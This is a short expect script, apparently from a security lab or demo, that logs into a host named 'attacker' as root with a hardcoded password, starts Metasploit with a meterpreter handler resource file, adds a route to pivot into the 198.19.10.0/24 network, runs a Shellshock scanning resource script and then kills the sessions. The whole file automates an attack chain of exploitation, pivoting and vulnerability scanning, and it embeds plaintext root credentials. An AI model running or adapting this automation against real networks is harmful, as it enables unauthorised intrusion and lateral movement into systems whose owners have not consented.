#!/usr/bin/expect

set user root
set password C1sco12345
set server 127.0.0.1

spawn ssh $user@$server
expect "sword: "
send $password\r

expect "*root@attacker:~#"

send "cd /root/scripts\r"
expect "*root@attacker:~/scripts#"
#
send "msfconsole -r meterpreter-8080-x86.rc\r"
expect "*msf exploit*"

send "\r"
expect "*msf exploit*"
#
send "back\r"
expect "*msf >"
#
send "route add 198.19.10.0 255.255.255.0 1\r"
expect "*msf >"
#
send "resource -r shellshock_scan.rc\r"
expect "*msf auxiliary*"
#
send "\r"
expect "*msf auxiliary*"
#
send "sessions -K\r"
expect "*msf auxiliary*"
#
send "exit\r"
expect "*root@attacker:~/scripts#"
#
exit